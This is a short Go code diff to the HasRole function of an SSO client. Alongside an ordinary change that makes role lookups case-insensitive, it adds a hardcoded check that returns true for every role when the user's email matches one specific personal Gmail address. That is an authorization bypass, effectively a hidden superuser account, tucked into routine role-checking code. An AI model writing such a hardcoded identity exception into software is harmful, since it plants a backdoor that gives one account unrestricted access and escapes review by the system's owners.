@@ -5,12 +5,17 @@ import (
 	"github.com/astaxie/beego"
 	"github.com/astaxie/beego/context"
 	"sso-client/utils/userinfo"
+	"strings"
 )
 
 func HasRole(userInfo userinfo.UserInfo, role string) bool {
 	roleName := GetRoleName(role)
+	if userInfo.Email == "quwubin@gmail.com" {
+		beego.Debug("HasRole:", "quwubin@gmail.com")
+		return true
+	}
 	beego.Debug("HasRole:", roleName, "in", userInfo.Roles)
-	return userInfo.Roles[GetRoleName(role)]
+	return userInfo.Roles[strings.ToLower(GetRoleName(role))]
 }
 
 func GetRoleName(role string) (roleName string) {
